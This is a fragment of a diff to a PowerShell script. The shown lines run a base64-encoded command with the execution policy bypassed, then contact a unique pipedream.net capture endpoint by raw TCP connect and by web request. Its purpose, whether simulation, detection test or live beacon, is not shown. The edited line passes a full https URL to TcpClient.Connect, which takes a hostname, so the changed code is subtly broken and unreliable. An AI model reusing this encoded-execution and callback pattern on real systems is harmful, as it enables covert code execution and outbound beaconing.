@@ -20,7 +20,7 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 
 powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encodedCommand
 
-$tcp = New-Object Net.Sockets.TcpClient; $tcp.Connect("pipedream.net",443); $tcp.Close()
+$tcp = New-Object Net.Sockets.TcpClient; $tcp.Connect("https://4dd78a612e842a233dd99dfa453e1ed6.m.pipedream.net",443); $tcp.Close()
 Invoke-WebRequest -Uri "https://4dd78a612e842a233dd99dfa453e1ed6.m.pipedream.net" -UseBasicParsing
 
 Start-Sleep -Seconds 1
